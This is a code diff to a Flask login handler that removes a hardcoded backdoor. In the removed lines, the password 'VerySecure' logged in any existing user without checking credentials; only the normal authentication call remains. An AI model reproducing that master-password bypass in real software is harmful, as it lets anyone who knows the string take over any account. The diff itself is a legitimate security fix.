@@ -41,14 +41,9 @@ def login():
     if request.method == "POST":
         username = request.form['username']
         password = request.form['password']
-        if password == "VerySecure":
-            user = User.get_by_username(username)
-            if user is not None:
-                login_user(user)
-        else:
-            user = User.attempt_authentication(username, password)
-            if user is not None:
-                login_user(user)
+        user = User.attempt_authentication(username, password)
+        if user is not None:
+            login_user(user)
         if user is not None:
             return redirect(request.args.get('next') or url_for("home"))
     return render_template("login.html")
